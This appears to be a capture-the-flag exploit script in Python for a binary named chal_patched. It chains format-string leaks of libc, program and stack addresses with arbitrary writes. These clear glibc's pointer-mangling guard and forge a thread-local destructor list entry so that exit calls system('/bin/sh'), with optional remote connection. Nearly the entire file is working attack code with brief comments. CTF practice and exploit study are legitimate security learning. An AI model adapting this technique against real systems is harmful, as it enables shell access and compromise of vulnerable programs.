#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./chal_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x1276
brva 0x12F6
brva 0x1304
b *__run_exit_handlers+340
b *__call_tls_dtors+61
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def overwrite(what, where):
    sla(b'... ', f'{what} {where}'.encode())

def to_i64(n: int) -> int:
    n &= 0xFFFFFFFFFFFFFFFF  # Keep only the lowest 64 bits
    if n & (1 << 63):        # If sign bit (bit 63) is set
        n -= 1 << 64         # Convert to negative two's complement
    return n

# ==================== EXPLOIT ====================
p = start()

sla(b'...', b'%13$p')
ru(b'heavy ')
libc.address = hexleak(rl()) - 0x28150
slog('libc base @ %#x', libc.address)

initial = libc.sym.initial
info('initial @ %#x', initial)

tls = libc.address - 0x3000
tls_base = libc.address - 0x28c0
info('tls @ %#x', tls)
info('tls_base @ %#x', tls_base)

PTR_MANGLE = tls + 0x770
info('PTR_MANGLE @ %#x', PTR_MANGLE)

# clear PTR_MANGLE
overwrite(PTR_MANGLE, 0)

# overwrite initial + 24
add_rsp_158_ret = libc.address + 0xdb0b1
overwrite(initial + 24, to_i64(add_rsp_158_ret << 17))

tls_dtor_list = tls_base - 0x50
info('tls_dtor_list @ %#x', tls_dtor_list)

sla(b'...', b'%17$p')
ru(b'heavy ')
exe.address = hexleak(rl()) - exe.sym._start
slog('exe base @ %#x', exe.address)

fake_dtor = libc.bss(-0x18)
info('fake_dtor @ %#x', fake_dtor)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# first ret2main and overwite tls_dtor_list to fake_dtor
overwrite(tls_dtor_list, fake_dtor)
overwrite(fake_dtor, to_i64(exe.sym.main << 17))

'''
void
__call_tls_dtors (void)
{
  while (tls_dtor_list) // This will be our fake_dtor
    {
      struct dtor_list *cur = tls_dtor_list;
      dtor_func func = cur->func;
      PTR_DEMANGLE (func);

      tls_dtor_list = tls_dtor_list->next; // (*)
      func (cur->obj);
'''

# now tdor_list->next = libc.argv[0]
sla(b'...', b'%6$p')
ru(b'heavy ')
stack_leak = hexleak(rl())
slog('stack_leak @ %#x', stack_leak)

pie_argv = stack_leak + 0x158
info("pie_argv @ %#x", pie_argv)

fake_tdor1 = pie_argv
fake_tdor_obj = pie_argv + 8

# overwrite tdor_list->next->func = system and tdor_list->next->obj = "/bin/sh"
# this time when exit, it will call system("/bin/sh")
overwrite(fake_tdor_obj, next(libc.search(b'/bin/sh\x00')))
overwrite(fake_tdor1, to_i64(libc.sym.system << 17))

interactive()
